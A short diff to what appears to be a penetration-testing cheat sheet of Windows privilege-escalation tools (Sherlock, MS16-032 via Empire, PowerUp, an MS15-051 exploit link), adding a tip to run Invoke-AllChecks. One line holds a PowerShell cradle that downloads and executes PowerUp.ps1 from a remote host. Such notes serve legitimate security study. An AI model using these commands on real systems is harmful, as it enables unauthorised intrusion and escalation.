@@ -72,6 +72,7 @@ metasploit local_exploit_suggester --> find vulns
 sherlock --> find vulns
 MS16-032 --> empire --> https://github.com/EmpireProject/Empire.git --> empire/data/module_source/privesc/Invoke-MS16032.ps1 !!! BE SURE TO RUN IN X64
 powerup --> empire echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerUp.ps1') | powershell -noprofile -
+  Either append Invoke-Allchecks at the bottom or after execution type Invoke-AllChecks
 MS15-051 --> https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 
 LINUX
